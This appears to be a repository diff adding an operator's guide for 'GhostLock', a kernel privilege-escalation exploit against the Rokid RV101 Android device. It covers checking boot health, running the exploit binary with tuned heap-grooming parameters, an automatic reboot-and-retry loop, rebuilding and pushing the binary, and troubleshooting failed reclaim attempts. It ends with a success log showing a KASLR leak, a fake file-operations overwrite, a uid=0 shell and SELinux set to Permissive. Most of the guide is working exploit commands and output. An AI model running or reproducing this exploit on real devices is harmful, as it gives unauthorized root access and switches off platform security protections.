@@ -1,0 +1,198 @@
+# GHOSTLOCK RV101 — Root Acquisition Operation Guide (v9.60)
+
+> 中文版：[GHOSTLOCK_ROOT_操作說明.md](GHOSTLOCK_ROOT_%E6%93%8D%E4%BD%9C%E8%AA%AA%E6%98%8E.md)
+
+> ⚠ **2026-09-13 update**: the repo path has changed to `/home/kali/rokid_root` (this document originally used Windows paths; they have all been replaced).
+> This file is a **manual fallback** operation guide; the App-side engine has switched to runtime automatic detection (`AutoGhostlockEngine`),
+> so normally only `deploy/root_bridge.sh` or `deploy/start_shizuku.sh` is needed. For the latest flow see `docs/deploy.md`.
+
+
+> Applicable device: Rokid RV101 (serial `<DEVICE_SERIAL>`, Android 12, kernel 5.10.209-perf).
+> Purpose: local privilege escalation research — obtain a **uid=0 gid=0** root shell and turn off SELinux.
+> **Scope**: this single controlled lab device only; do not generalize it or add any remote/persistence/stealth functionality.
+
+---
+
+## 0. Summary of results (what can be done now)
+
+After a successful run, the child process reports:
+
+```
+child uid = 0 (0x00000000) gid = 0 (0x00000000)
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+Permissive
+```
+
+- `uid=0`, `gid=0` (clean root, not a garbage gid).
+- `getenforce` returns `Permissive` (SELinux is off).
+- Produces a root-owned `/data/local/tmp/su_gl` (proof of root write capability).
+- Spawns an interactive `/system/bin/sh` root shell.
+
+**Known mechanism**: the mode-5 write puts `init_cred` into the child's `task->cred` (uid=0),
+and the child then uses `setgroups(0)+setgid(0)` to repair the gid that mode-5 blew up back to 0 (user-space, no extra reclaim).
+
+---
+
+## 1. Prerequisites
+
+| Item | Value |
+|---|---|
+| Device serial | `<DEVICE_SERIAL>` |
+| adb (Windows) | `/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe` |
+| Binary on device | `/data/local/tmp/ghostlock_rv101` |
+| Binary sha1 | `4eeb98171ed21113130d5f2676a0bd283c8f56c7` (v9.60) |
+| Source | `/home/kali/rokid_root/source_code/ghostlock_rv101/` |
+| Wrapper scripts | `/home/kali/rokid_root/scripts/ghostlock_run.sh`, `boot_run_loop.sh` |
+
+First confirm the binary is correct (the sha1 must match):
+
+```bash
+ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"; S="<DEVICE_SERIAL>"
+"$ADB" -s $S shell sha1sum /data/local/tmp/ghostlock_rv101
+# should return: 4eeb98171ed21113130d5f2676a0bd283c8f56c7
+```
+
+---
+
+## 2. Step 1 — Check boot health (most important)
+
+The **only variable** in whether root succeeds is boot health (`/proc/loadavg` 4th field = the system's total thread count `nr_threads`).
+
+```bash
+"$ADB" -s $S shell cat /proc/loadavg
+# example: 0.32 0.24 0.23 1/1247 25299
+#                    ^^^^^^ 4th field running/total, total=1247
+```
+
+Decision:
+- **total < 3000** → good boot, may run.
+- **total > 5000** (camera/ISP service stuck and spawning threads) → **reboot and wait**.
+
+```bash
+"$ADB" -s $S reboot   # reboot directly on a bad boot
+```
+
+> A good boot usually appears ~2–6 minutes after boot; the key is `nr_threads < 3000`, not uptime.
+
+---
+
+## 3. Step 2 — Run (choose one of two)
+
+### Method A: single run (manual)
+
+```bash
+cd /home/kali/rokid_root
+./scripts/ghostlock_run.sh w2 v960 \
+  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 /data/local/tmp/ghostlock_rv101"
+```
+
+### Method B: automatic retry (recommended; reboots automatically until success)
+
+```bash
+cd /home/kali/rokid_root
+./scripts/boot_run_loop.sh 6 w2 v960 "gid = 0 (" \
+  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1" /data/local/tmp/ghostlock_rv101
+```
+
+- Method B will: `reboot → wait for boot → wait for nr_threads<2500 → timeout 240s to run → grep for success → stop/retry`.
+- On success it prints `SUCCESS_LOG=...`, and the log is stored in `reports/ghostlock_runlogs/`.
+
+---
+
+## 4. Step 3 — Confirm success
+
+Look for these criteria in the log or on the device (any one of them means success):
+
+```bash
+# 1) confirm on the device that SELinux is off
+"$ADB" -s $S shell getenforce        # should return Permissive
+
+# 2) confirm root write capability (su_gl is owned by root)
+"$ADB" -s $S shell "ls -la /data/local/tmp/su_gl"
+# should return: -rwxr-xr-x 1 root ... /data/local/tmp/su_gl
+```
+
+Key success lines in the log:
+
+```
+[*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
+[+] child is root!
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+Permissive
+```
+
+---
+
+## 5. Environment variable reference
+
+| Variable | Default | Effect |
+|---|---|---|
+| `GL_PURGE_CNT` | 700 (use 0) | purge squad size; **set 0** to avoid the kernel-stack purge burying the leak slab |
+| `GL_TAIL_KILLS` | 0 (use 16) | How many dummy slabs to cross before killing the first child to trigger leak slab discard (14=minimum) |
+| `GL_DUMMY_KILLS` | 0 | phase-3 dummy kill count; **set 0** |
+| `W2_ATTEMPTS` | 10 (use 1) | number of W2 rounds |
+| `FOPS_ATTEMPTS` | 3 | FOPS install retry count (new in v9.60, adjustable 1–6) |
+| `GL_SKB_PAD` | 0 | SKB payload offset |
+
+> Official run parameters: `GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1`.
+
+---
+
+## 6. Troubleshooting
+
+| Symptom | Cause | Handling |
+|---|---|---|
+| log shows `kernelsnitch mm leak failed (… r=8)` or `dummy clones ok=… fail=… (errno=11)` | **bad boot**: nr_threads too high, fork resources exhausted | `reboot`, wait for `nr_threads<3000`, then run |
+| `install_fake_fops_v2 DIAG: write#1 MISSED` (multiple times) | **reclaim flake**: the SKB cannot grab the leak slab (o2 churn) | just `reboot` and retry; no need to force a retry on the same boot |
+| Still not obtained 6 minutes after boot | camera/ISP services start spawning threads (bad boot) | `reboot` and catch an earlier window (within 2–5 minutes of boot) |
+| Device suddenly offline / `device not found` | possibly a panic triggered by reclaim resource exhaustion | wait for the reboot and run again on a fresh boot; note the last uptime |
+| `id -g` shows a garbage number | old version (v957) gid clobber | **upgrade to v9.60** (already fixed with user-space setgid) |
+| After success, you want to feed commands into the root shell but the piped stdin does not respond | **Windows adb.exe through WSL interop does not forward pipe stdin** to the device shell (hit on 2026-08-23) | after success the system is already Permissive: normal `adb shell` can directly do `setprop`/`dumpsys`/most operations; when a real uid=0 is needed, rewrite the contents of `/data/local/tmp/.ghostlock_root.sh` and rerun the exploit |
+
+---
+
+## 7. Rebuild / push (only needed after changing source)
+
+```bash
+cd /home/kali/rokid_root/source_code/ghostlock_rv101
+NDKBIN="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/ndk/android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64/bin"
+"$NDKBIN/clang.exe" --target=aarch64-linux-android31 -O2 -Wall -Wextra \
+  -Wno-unused-parameter -Wno-sign-compare -fno-stack-protector -fPIE -Isrc \
+  -include target_rv101.h -o build/ghostlock_rv101 src/main.c src/util.c src/route.c \
+  -pie -static-libgcc -pthread
+
+ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
+"$ADB" -s <DEVICE_SERIAL> push build/ghostlock_rv101 /data/local/tmp/ghostlock_rv101
+"$ADB" -s <DEVICE_SERIAL> shell "chmod 755 /data/local/tmp/ghostlock_rv101"
+```
+
+---
+
+## 8. What this version (v9.60) fixed (speeding up root)
+
+1. **`FOPS_ATTEMPTS` changed from a fixed 6 to an env-adjustable value (default 3)**: after the 3rd attempt reclaim has already degraded (dip=0,
+   memfd pin accumulation starves the per-CPU partial chain), so retrying only burns ~30–60s each time for nothing. A bad boot now gives up faster and
+   reboots faster.
+2. **Fixed the `v9.55 fork-limit` diagnostic bug**: it used to print `errno=0 Success` (`dfirst_err` was not assigned before printing);
+   now the `clone()` errno is captured before printing, so a bad boot shows the real `errno=11 (EAGAIN)`.
+3. **Updated the version banner** `v9.30 → v9.60`.
+4. **Removed the unused `timer_reset()`** (eliminating a build warning).
+
+---
+
+## 9. A complete demonstration (measured on v9.60, success ~113s after boot)
+
+```
+[+] ghostlock_rv101 v9.60 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] KASLR: slide=0x00000026ba000000 base=0xffffffe6c2000000 (2 anchors)
+[*] FOPS install attempt 1/3
+[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 17, ...)
+[*] round 1/1: child=9071 prev=0xffffff803c7c4dc8 ... stable=1 task=0xffffff803c7c4900
+[*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
+[+] child is root!
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+Permissive
+[*] [T+113411ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
+```
+
+Corresponding log: `reports/ghostlock_runlogs/run_w2_demo_v960_142523.log`.
